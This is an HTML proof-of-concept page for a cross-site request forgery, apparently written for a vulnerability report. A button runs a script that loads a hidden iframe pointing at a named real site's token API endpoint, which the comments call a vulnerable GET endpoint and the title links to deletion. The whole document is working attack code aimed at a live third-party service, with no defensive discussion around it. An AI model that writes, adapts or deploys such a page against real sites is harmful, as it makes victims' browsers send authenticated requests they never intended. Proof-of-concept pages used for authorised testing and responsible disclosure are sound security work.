<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>CSRF PoC - GET Trigger</title>
</head>
<body>
  <h2>CSRF Proof of Concept (GET Triggered Deletion)</h2>

  <!-- Button to manually trigger the CSRF -->
  <button onclick="triggerCSRF()">Trigger CSRF</button>

  <script>
    function triggerCSRF() {
      // Create a hidden iframe to send the GET request
      var iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = "https://www.datacamp.com/api/jwt/token"; // <-- vulnerable GET endpoint
      document.body.appendChild(iframe);

      alert("CSRF GET Triggered!");
    }
  </script>
</body>
</html>
